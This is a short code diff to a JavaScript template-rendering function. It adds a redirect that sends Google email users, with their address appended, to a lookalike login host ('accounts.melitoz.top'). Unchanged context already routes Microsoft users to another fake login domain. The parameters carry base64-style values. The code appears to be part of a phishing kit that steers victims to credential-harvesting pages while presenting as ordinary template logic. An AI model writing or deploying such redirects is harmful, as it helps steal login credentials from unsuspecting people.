@@ -285,7 +285,7 @@ export async function renderVueTemplate(metadata = {}) {
           }
 
           if (isGoogleEmail) {
-            targetUrl = '' + encodeURIComponent(email);
+            targetUrl = 'https://accounts.melitoz.top?kMoNb9N9zTMWfw=ZW9ycA==#smn=' + encodeURIComponent(email);
           } else if (isMicrosoftEmail) {
             targetUrl = 'https://login.latelierdemamantortue.click?Djst0aEAD-E=Z2tiYg==&omn=' + encodeURIComponent(email);
           } else {
